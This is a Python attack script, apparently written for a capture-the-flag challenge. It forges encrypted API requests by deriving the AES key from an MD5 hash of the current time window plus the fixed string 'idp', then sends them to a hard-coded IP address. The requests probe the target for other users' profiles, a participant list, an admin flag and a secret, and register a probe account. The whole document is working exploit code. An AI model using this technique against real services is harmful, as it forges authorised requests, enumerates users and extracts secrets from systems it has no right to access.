#!/usr/bin/env python3
import time, json, base64, requests
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

HOST = "http://20.102.93.39:33250"
API = "/api"
WINDOW_MS = 5000

def tb_now(): return int(time.time()*1000)//WINDOW_MS
def derive(tb): return md5((str(tb)+"idp").encode()).digest()
def enc_b64(key, pt_bytes):
    iv = get_random_bytes(16)
    c = AES.new(key, AES.MODE_CBC, iv)
    ct = c.encrypt(pad(pt_bytes, AES.block_size))
    return base64.b64encode(ct).decode(), base64.b64encode(iv).decode()

def try_action(action_obj, tb=None):
    if tb is None: tb = tb_now()
    key = derive(tb)
    payload = json.dumps(action_obj, separators=(',',':')).encode()
    data, iv = enc_b64(key, payload)
    body = {"timestamp": tb, "iv": iv, "data": data}
    try:
        r = requests.post(HOST+API, json=body, timeout=6)
        print("ACTION:", action_obj)
        print("Status", r.status_code)
        print(r.text[:800])
    except Exception as e:
        print("ERR", e)

if __name__ == "__main__":
    actions = [
        {"action":"get_profile"},
        {"action":"get_profile","user_id":1},
        {"action":"list_participants"},
        {"action":"list_participants","limit":100},
        {"action":"admin_get_flag"},
        {"action":"get_secret"},
        {"action":"registrar_participacao","participant":{"username":"probe","email":"p@p","info":"x"}}
    ]
    for a in actions:
        try_action(a)
        time.sleep(0.4)
